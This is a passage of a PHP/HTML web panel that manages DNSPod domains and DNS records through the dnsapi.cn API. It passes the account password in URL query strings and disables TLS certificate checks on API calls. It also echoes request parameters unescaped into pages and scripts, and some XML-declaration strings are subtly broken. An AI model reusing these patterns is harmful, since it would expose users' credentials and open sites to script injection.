 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.dnspod.submit();
}
function doitem(act)
{
 if(!confirm('确定更改选中的域名状态吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&type=".$type."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&status=' + act;
 document.dnspod.submit();
}
</script>       
                <?php 
                $totalitem = $dnspoddomainlist['totalitem'];
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $totalitem;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> - <?php if (trim(request("type"))!="mine" && trim(request("type"))!=""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine";?>" style="color:#444444">Mine</a><?php }elseif (trim(request("type"))=="mine" || trim(request("type"))==""){echo "Mine";}?>/<?php if (trim(request("type"))!="share" || trim(request("type"))==""){?><a href="<?php echo ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri($dnspodu)."&pwd=".encodeuri($dnspodp)."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=share";?>" style="color:#444444">Shared</a><?php }elseif (trim(request('type')=='share')){echo "Shared";}?> <?php  if (trim($_SESSION["dnspod"]["uname"]) != "" && trim($_SESSION["dnspod"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&logout=1";?>" target="_self">退出</a><?php  } ?>] </td>
        </tr>
</table>        
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="dnspod" method="post" action="">
                <?php 
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=25%>
                        域名值
                </td>
                <td align="center" width=10%>
                        等级
                </td> 
                <td align="center" width=10%>
                        记录数
                </td>
                <td align="center" width=25%>
                        共享来源
                </td>
                <td align="center" width=30%>
                        <a style="color:#444444" href="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&skin=<?php  echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php  echo encodeuri(trim(request("pwd")));?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page;?>">添加</a> 搜索 <a style="color:#444444" href="javascript:delitem();">删除</a> <a style="color:#444444" href="javascript:doitem('enable');">启</a>/<a style="color:#444444" href="javascript:doitem('disable');">停</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $strpagesize-1;$i++){
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $domainid = $dnspoddomainlist[$i]['domainid'];
                        $domain = $dnspoddomainlist[$i]['domain'];
                        $domaingrade = $dnspoddomainlist[$i]['domaingrade'];
                        $domainstatus = $dnspoddomainlist[$i]['domainstatus'];
                        $domainrecords = $dnspoddomainlist[$i]['domainrecords'];
                        $domainshared = $dnspoddomainlist[$i]['domainshared'];

                        if ($domainstatus == "enable" || $domainstatus == "1")
                                echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=1&skin=".$skincolor."&domainid=".$domainid."&topdomain=".encodeuri($domain)."&grade=".encodeuri($domaingrade)."'>".$domain."</a>";
                        else    
                                echo " ".$domain." ";
                ?>
                </td>
                <td align="center">
                        <?php echo $domaingrade;?> 
                </td> 
                <td align="center">
                        <?php echo $domainrecords;?>
                </td>
                <td align="center">
                        <?php echo $domainshared;?>
                </td>
                <td align="center"><a style="color:#444444" href="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>&domainid=<?php echo $domainid;?>&topdomain=<?php echo $domain;?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri($domaingrade)?>">添加</a> <a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri($domainid)."&type=".encodeuri($type)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a> <?php if ($domainstatus == 'enable' || $domainstatus == '1'){?><a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">停用</a><?php }else{?><a style="color:#444444" href="<?php  echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".$domainid."&type=".encodeuri($type)."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">启用</a><?php }?> 导入 导出</td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&type=".trim(request("type"))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&type=".trim(request("type"))."'>下一页</a> ";
                				
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                				
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&type=".trim(request("type"))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
                // action - Domain.List start
        case "Domain.Create": // action - Domain.Create start
                if (trim(request("domain")) == ""){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&pagesize=<?php  echo encodeuri($pagesize)."&page=".trim(request("page"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp域名：<input type="text" class="text" name="domain" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER["HTTP_REFERER"]))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                }
                elseif (trim(request("domain")) != ""){
                        $dnspod = new dnspod_class();
                        $dnspoddomaincreate = $dnspod->dnspoddomaincreate($dnspoduname,$dnspodpwd,trim(request('domain')));
                        $timeout = "5000";
                        if ($dnspoddomaincreate['code'] == "1"){
                        ?>
<script language=javascript>
        alert("请手动更改 \n   <?php  echo $dnspoddomaincreate['punycode'];?> \n NS记录为: \n f1g1ns1.dnspod.net  \n f1g1ns2.dnspod.net ");
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名添加成功！域名ID：<?php  echo $dnspoddomaincreate['id'];?> 实际域名：<?php echo $dnspoddomaincreate['punycode']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                
                        }       
                        else{   
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名添加失败！原因：<?php echo $dnspoddomaincreate['message']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";                
                        }
                }       
                else{ 
                        AlertBack ("域名格式错误！" , 2);
                }
                break;
        case "Domain.Remove": // action - main start
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>

        <script language="vbscript">
        <!--
                Dim delok
                delok = MsgBox("是否删除该相册！", vbOKCancel, "X3193")
                If delok = vbOK Or delok = vbYes Then
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                else    
                        MsgBox("该相册删除取消！")
                        window.location.href="<?php echo trim(request("refer"))?>"
                End If
        //-->
        </script>
                <?php 
                        break;
                     }

                }
                if (trim(request("domain_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何域名！" , 2);
                        break;
                }
                $dnspod = new dnspod_class();
                $dnspoddomainremove = $dnspod->dnspoddomainremove($dnspoduname,$dnspodpwd,trim(request('domain_id')),trim(request('type')),$_POST,$page,$pagesize);

                if ($dnspoddomainremove['code'] == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }
                elseif ($xmlstr != "" && $xmlstr != "wait"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除失败！原因： <?php echo $dnspoddomainremove['message'];?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                break;  // action - Domain.Create start
        case "Domain.Status": // action - Domain.Status start
                if (trim(request("domain_id")) != ""){
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Domain status changed success.</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Domain.Status";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'status' => trim(request("status")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) == "" && count($_POST) > 0){
                        //print_r($_POST);
                        if (0){
                                $totalrecord = '220';
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get domain list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                                '</info>'.
                                                '<domains>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }       
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                        '<item>'.
                                                        '<id>141842</id>'.
                                                        '<name>dnspoo.com</name>'.
                                                        '<grade>D_Free</grade>'.
                                                        '<status>enable</status>'.
                                                        '<records>0</records>'.
                                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                        '</item>';              
                                }
                                $xmlstr = $xmlstr.
                                                '</domains>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Domain.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'format' => 'xml',
                                        'type' => trim(request('type'))==''?'mine':trim(request('type')),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $type = trim(request('type'))==''?'mine':trim(request('type'));
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);      
                        $objList = $objXml->getElementsByTagName("item");                       
                        //echo $objList->item(0)->getElementsByTagName("id")->item(0)->nodeValue;
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }

                        $xmlstr = "";
                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
                                        if (0){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Domain status changed success.</message>'.
                                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Domain.Status";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'status' => trim(request("status")),
                                                        'format' => 'xml'
                                                );                                              
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何域名！" , 1);
                        break;
                }

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                域名<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>失败！, 原因: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php       
                }
                break;   // action - Domain.Status end
        case "Record.List": // action - Record.List start
                if (0){
                        $totalrecord = '220';
                        $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Get record list success</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '<info>'.
                                        '<record_total>'.$totalrecord.'</record_total>'.
                                        '</info>'.
                                        '<records>';
                        if (ceil($totalrecord/$pagesize) > $page){
                                $strpagesize = $pagesize;
                        }       
                        elseif (ceil($totalrecord/$pagesize) == $page){
                                $strpagesize = fmod($totalrecord,$pagesize);
                        }       
                        for($i=1;$i<=$strpagesize;$i++){
                                $xmlstr = $xmlstr.
                                        '<item>'.
                                        '<id>5246120</id>'.
                                        '<name>@</name>'.
                                        '<line><![CDATA[默认]]></line>'.
                                        '<type>A</type>'.
                                        '<ttl>600</ttl>'.
                                        '<value>1.1.1.1</value>'.
                                        '<mx>0</mx>'.
                                        '<enabled>1</enabled>'.
                                        '<updated_on>2010-10-07 14:14:20</updated_on>'.
                                        '</item>';
                        }               
                        $xmlstr = $xmlstr.
                                        '</records>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Record.List";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'domain_id' => trim(request("domainid")),
                                'offset' => $pagesize*($page-1),
                                'length' => $pagesize,
                                'format' => 'xml'
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                }       
                while(strpos($xmlstr, '<![CDATA[')){
                        $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                }
                if (strpos($xmlstr, '<?php xml version="1.0" encoding="utf-8"')==0){
                        $xmlstr = preg_replace("/(.*)(\<\?xml version=\"1.0\" encoding=\"utf-8\"\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                }
                //echo $xmlstr;
                //return;

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == '1'){
                }       
                else{
                        AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);           
                }

                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                }
                elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                        AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);   
                }       

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                // 加Xml 文件    
                $objXml->loadXML($xmlstr);
                $objList = $objXml->getElementsByTagName("item");               
                //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                //echo $objList->length;
                if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                //echo $strpagesize;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.dnspod.chidd'+i))
 {
  eval('document.dnspod.chidd'+i).checked = document.dnspod.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的子域名吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&delok=1';
 document.dnspod.submit();
}
function doitem(act)
{
 if(!confirm('确定更改选中的子域名状态吗?')) return;
 document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&status=' + act;
 document.dnspod.submit();
}
</script>       
                <?php 
                $totalitem = $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $totalitem;?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo trim(request("topdomain"))?>  </td>
        </tr>
</table>        
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="dnspod" method="post" action="">
                <?php 
